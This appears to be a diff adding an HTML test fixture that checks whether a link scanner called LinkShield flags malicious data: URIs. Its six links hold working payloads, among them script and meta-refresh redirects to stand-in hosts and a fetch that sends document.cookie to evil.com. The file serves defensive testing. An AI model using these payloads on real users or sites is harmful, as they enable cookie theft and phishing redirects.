@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data URI Attack Test - Security Audit 5.1</title>
+    <style>
+        body {
+            padding: 20px;
+            font-family: Arial, sans-serif;
+        }
+
+        .test-item {
+            margin: 15px 0;
+            padding: 10px;
+            border: 1px solid #ccc;
+            background: #f9f9f9;
+        }
+
+        .dangerous {
+            color: red;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Data URI Attack Test</h1>
+    <p>LinkShield must detect malicious data: URIs that redirect or execute scripts.</p>
+
+    <div class="test-item">
+        <h3>Test 1: HTML Redirect via Data URI</h3>
+        <a href="data:text/html,<script>location='http://evil.com/steal'</script>" class="dangerous">
+            Click Here (data:text/html redirect)
+        </a>
+    </div>
+
+    <div class="test-item">
+        <h3>Test 2: Base64 Encoded Redirect</h3>
+        <a href="data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cDovL2V2aWwuY29tL3N0ZWFsJzwvc2NyaXB0Pg=="
+            class="dangerous">
+            Click Here (base64 encoded)
+        </a>
+        <div style="font-size: 12px; color: #666;">
+            Decodes to: &lt;script&gt;location='http://evil.com/steal'&lt;/script&gt;
+        </div>
+    </div>
+
+    <div class="test-item">
+        <h3>Test 3: Data URI with Meta Refresh</h3>
+        <a href="data:text/html,<meta http-equiv='refresh' content='0;url=http://phishing.com'>" class="dangerous">
+            Click Here (meta refresh)
+        </a>
+    </div>
+
+    <div class="test-item">
+        <h3>Test 4: Data URI Cookie Stealer</h3>
+        <a href="data:text/html,<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>"
+            class="dangerous">
+            Click Here (cookie stealer)
+        </a>
+    </div>
+
+    <div class="test-item">
+        <h3>Test 5: Data URI Form Submission</h3>
+        <a href="data:text/html,<form action='http://evil.com/steal' method='POST'><input name='data' value='stolen'></form><script>document.forms[0].submit()</script>"
+            class="dangerous">
+            Click Here (auto-submit form)
+        </a>
+    </div>
+
+    <div class="test-item">
+        <h3>Test 6: SVG Data URI with Script</h3>
+        <a href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert('XSS')</script></svg>"
+            class="dangerous">
+            Click Here (SVG with script)
+        </a>
+    </div>
+
+    <script>
+        console.log('[DATA URI] Loaded 6 data URI attack vectors');
+        console.log('[DATA URI] All data: URIs should be flagged as high-risk');
+    </script>
+</body>
+
+</html>
